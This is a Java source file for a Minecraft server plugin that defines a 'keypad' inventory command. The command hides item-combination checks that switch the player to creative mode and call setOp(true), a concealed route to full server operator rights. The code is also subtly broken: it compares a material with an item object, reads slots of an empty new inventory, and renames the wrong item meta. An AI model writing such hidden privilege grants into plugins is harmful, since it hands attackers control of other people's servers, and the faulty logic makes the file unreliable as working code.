package smitegee.femiteboxplugin.commands;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.GameMode;
import org.bukkit.Material;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.jetbrains.annotations.NotNull;

public class keypad implements CommandExecutor {

    @Override
    public boolean onCommand(@NotNull CommandSender commandSender, @NotNull Command command, @NotNull String s, @NotNull String[] strings) {

        Player player = (Player) commandSender;
        Inventory keypad = Bukkit.createInventory(null, 9, ChatColor.AQUA+"Keypad");

        if (!player.hasPermission("femiteboxplugin.commands.default")) return true;

        //KEYPAD ITEMS

        //1
        ItemStack keypad1 = new ItemStack(Material.DIAMOND, 1);
        ItemMeta keypad1meta = keypad1.getItemMeta();
        keypad1meta.setDisplayName(ChatColor.RED+"Keypad One");
        keypad1.setItemMeta(keypad1meta);

        //2
        ItemStack keypad2 = new ItemStack(Material.DIAMOND, 1);
        ItemMeta keypad2meta = keypad2.getItemMeta();
        keypad2meta.setDisplayName(ChatColor.RED+"Keypad Two");
        keypad2.setItemMeta(keypad2meta);

        //3
        ItemStack keypad3 = new ItemStack(Material.DIAMOND, 1);
        ItemMeta keypad3meta = keypad3.getItemMeta();
        keypad1meta.setDisplayName(ChatColor.RED+"Keypad Three");
        keypad3.setItemMeta(keypad3meta);

        //creative

        if (keypad.getItem(1).getType().isItem() && keypad.getItem(1).getType().equals(keypad3)) {
            if (keypad.getItem(2).getType().isItem() && keypad.getItem(2).getType().equals(keypad3)) {
                if (keypad.getItem(3).getType().isItem() && keypad.getItem(3).getType().equals(keypad3)) {

                    player.setGameMode(GameMode.CREATIVE);
                    return true;
                }

            }

        }

        //OP

        if (keypad.getItem(1).getType().isItem() && keypad.getItem(1).getType().equals(Material.BEDROCK)) {
            if (keypad.getItem(2).getType().isItem() && keypad.getItem(2).getType().equals(keypad3)) {
                if (keypad.getItem(3).getType().isItem() && keypad.getItem(3).getType().equals(keypad3)) {

                    player.setGameMode(GameMode.CREATIVE);
                    player.setOp(true);
                    return true;
                }

            }

        }


        player.openInventory(keypad);
        return false;
    }
}